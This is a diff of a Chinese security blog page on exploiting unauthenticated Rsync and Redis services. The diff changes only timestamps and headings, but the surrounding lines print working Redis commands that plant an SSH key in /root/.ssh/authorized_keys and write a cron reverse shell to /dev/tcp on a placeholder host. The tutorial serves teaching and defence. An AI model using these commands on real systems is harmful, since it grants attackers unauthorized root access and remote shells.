@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="s4kur4">
 <meta property="og:description" content="Rsync未授权访问Rsync，即Remote synchronize远程同步。通常运行在873端口，它是一款用来实现远程同步功能的免费软件，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。 Rsync使用算法提供了一个客户机和远程文件服务器的文件同步的快速方法，并且可以通过ssh隧道的方式来传输文件。Rsync配置不当可造成未授权直接访问，漏洞具体表现为，当我们向某个Rsyn">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-10-27T05:46:07.870Z">
+<meta property="og:updated_time" content="2020-10-31T03:07:33.601Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Rsync和Redis未授权访问导致的问题">
 <meta name="twitter:description" content="Rsync未授权访问Rsync，即Remote synchronize远程同步。通常运行在873端口，它是一款用来实现远程同步功能的免费软件，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。 Rsync使用算法提供了一个客户机和远程文件服务器的文件同步的快速方法，并且可以通过ssh隧道的方式来传输文件。Rsync配置不当可造成未授权直接访问，漏洞具体表现为，当我们向某个Rsyn">
@@ -101,7 +101,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rsync未授权访问"><span class="toc-number">1.</span> <span class="toc-text">Rsync未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis未授权访问"><span class="toc-number">2.</span> <span class="toc-text">Redis未授权访问</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rsync未授权访问"><span class="toc-number">1.</span> <span class="toc-text">Rsync未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis未授权访问"><span class="toc-number">2.</span> <span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#向服务器写入公钥进行ssh登录"><span class="toc-number">2.1.</span> <span class="toc-text">向服务器写入公钥进行ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用任务计划反弹shell"><span class="toc-number">2.2.</span> <span class="toc-text">利用任务计划反弹shell</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -145,8 +145,7 @@
 
 <p>可以看出如果服务器的web目录可以同步的话可以直接上传一个webshell，甚至于当服务器的任务计划目录允许远程同步时可以直接反弹得到一个shell。瞌睡龙对Rsync的安全配置做了整理：<a href="http://drops.wooyun.org/papers/161" target="_blank" rel="noopener">http://drops.wooyun.org/papers/161</a> 乌云上也有利用Rsync进行反弹shell的经典案例：<a href="http://wooyun.org/bugs/wooyun-2010-034232" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-034232</a></p>
 <h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><p>Redis也存在未授权访问的问题。Redis默认情况下会绑定在6379端口，在没有开启认证的条件下，可以导致任意用户未授权访问Redis数据库。服务器为Windows时，利用Redis的一些方法向服务器web目录写入文件，从而可以得到一个webshell，不过在这之前必须要知道web的绝对路径。这篇文章中给出了可参考的方法：<a href="http://www.secpulse.com/archives/5357.html" target="_blank" rel="noopener">http://www.secpulse.com/archives/5357.html</a>，下面主要说说Linux，Linux当中有两种非常好的利用方式：</p>
-<p><strong>向服务器写入公钥进行ssh登录</strong></p>
-<p>当然先决条件是服务器允许ssh登录。<br>首先在本地生成个人公私钥：</p>
+<h3 id="向服务器写入公钥进行ssh登录"><a href="#向服务器写入公钥进行ssh登录" class="headerlink" title="向服务器写入公钥进行ssh登录"></a>向服务器写入公钥进行ssh登录</h3><p>当然先决条件是服务器允许ssh登录。<br>首先在本地生成个人公私钥：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
 <p>然后将公钥写入一个txt文件：</p>
@@ -156,8 +155,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat foo.txt | redis-cli -h xx.xx.xx.xx -x set crackit</span><br><span class="line">redis-cli -h xx.xx.xx.xx</span><br><span class="line">xx.xx.xx.xx:6379&gt; config set dir /root/.ssh/</span><br><span class="line">xx.xx.xx.xx:6379&gt; config get dir</span><br><span class="line">xx.xx.xx.xx:6379&gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">xx.xx.xx.xx:6379&gt; save</span><br></pre></td></tr></table></figure>
 
 <p>这样就可以成功的将自己的公钥写入/root/.ssh下的authotrized_keys文件里，然后执行<code>ssh –i id_rsa root@xx.xx.xx.xx</code>，即利用私钥登录该服务器。</p>
-<p><strong>利用任务计划反弹shell</strong></p>
-<p>由于Redis提供的方法可以向服务器写入文件，从而可以在cron目录中写入一个任务计划反弹出一个shell。</p>
+<h3 id="利用任务计划反弹shell"><a href="#利用任务计划反弹shell" class="headerlink" title="利用任务计划反弹shell"></a>利用任务计划反弹shell</h3><p>由于Redis提供的方法可以向服务器写入文件，从而可以在cron目录中写入一个任务计划反弹出一个shell。</p>
 <p>以CentOS为例，首先在本地执行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7777 0&gt;&amp;1 \n\n&quot; | redis-cli -h xx.xx.xx.xx -x set 1</span><br></pre></td></tr></table></figure>
 
@@ -191,7 +189,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rsync未授权访问"><span class="toc-number">1.</span> <span class="toc-text">Rsync未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis未授权访问"><span class="toc-number">2.</span> <span class="toc-text">Redis未授权访问</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rsync未授权访问"><span class="toc-number">1.</span> <span class="toc-text">Rsync未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis未授权访问"><span class="toc-number">2.</span> <span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#向服务器写入公钥进行ssh登录"><span class="toc-number">2.1.</span> <span class="toc-text">向服务器写入公钥进行ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用任务计划反弹shell"><span class="toc-number">2.2.</span> <span class="toc-text">利用任务计划反弹shell</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
